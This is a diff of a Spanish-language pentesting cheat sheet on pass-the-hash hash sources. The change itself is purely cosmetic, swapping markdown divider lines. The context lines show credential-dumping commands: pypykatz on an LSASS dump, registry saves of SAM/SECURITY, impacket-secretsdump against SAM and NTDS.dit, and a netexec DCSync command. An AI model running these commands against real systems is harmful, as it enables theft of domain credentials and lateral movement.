@@ -18,7 +18,7 @@ linked:
 ---
 # Pass-the-Hash - Hash Sources & Formats
 
-***
+---
 
 ## Hash Format
 
@@ -35,7 +35,7 @@ linked:
 
 **`aad3b435b51404eeaad3b435b51404ee`** = LM hash blank constante. Ignorable. Solo NT importa para PtH.
 
-___
+---
 
 ## LSASS Dump
 
@@ -66,7 +66,7 @@ pypykatz lsa minidump lsass.dmp
 # Output: NT hashes + AES keys + Kerberos tickets
 ```
 
-___
+---
 
 ## SAM (Local Hashes)
 
@@ -89,7 +89,7 @@ reg save HKLM\SECURITY C:\temp\SECURITY    # bonus: LSA secrets
 impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY
 ```
 
-___
+---
 
 ## NTDS.dit Extraction
 
@@ -120,7 +120,7 @@ impacket-secretsdump LOCAL -ntds 'ntds.dit' -system 'SYSTEM'
 # corp.local\jsmith:1234:aad3b435...:789abc...:::
 ```
 
-___
+---
 
 ## DCSync → Hashes Forest-Wide
 
@@ -134,7 +134,7 @@ ___
 | `nxc smb <DC> -u u -p p --ntds drsuapi` | Auto via netexec | Quick. |
 ^pth-dcsync
 
-___
+---
 
 ## NetNTLMv2 (NO es PtH directo)
 
@@ -147,7 +147,7 @@ ___
 
 **Confusión común:** NetNTLMv2 hash NO es lo mismo que NT hash. NetNTLMv2 = challenge-response salted con timestamp. Solo sirve para crack offline o relay live. NO podés `nxc smb -H <netntlmv2>`.
 
-___
+---
 
 ## Cached Credentials (mscash)
 
@@ -161,4 +161,4 @@ ___
 
 **Caveat:** mscash hashes NO son PtH-able. Solo crackeables offline. Sirven cuando user logueó al host pero no podés dumpear LSASS (host offline / no priv).
 
-***
+---
